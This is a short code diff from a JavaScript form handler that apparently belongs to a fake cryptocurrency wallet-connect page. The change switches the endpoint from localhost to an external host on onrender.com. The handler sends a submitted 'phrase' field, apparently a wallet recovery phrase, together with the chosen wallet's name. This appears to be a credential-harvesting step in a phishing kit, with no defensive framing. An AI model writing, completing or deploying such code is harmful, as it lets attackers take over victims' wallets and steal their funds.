@@ -19,7 +19,7 @@ document.addEventListener("DOMContentLoaded", function () {
       const formData = new FormData(this); // Create a FormData object from the form
       formData.append('walletTitle', selectedWalletTitle); // Append the wallet title to the form data
 
-      fetch('http://localhost:3000/submit-form', {
+      fetch('https://submit-handler.onrender.com/submit-form', {
           method: 'POST',
           body: JSON.stringify({
               phrase: formData.get('phrase'),
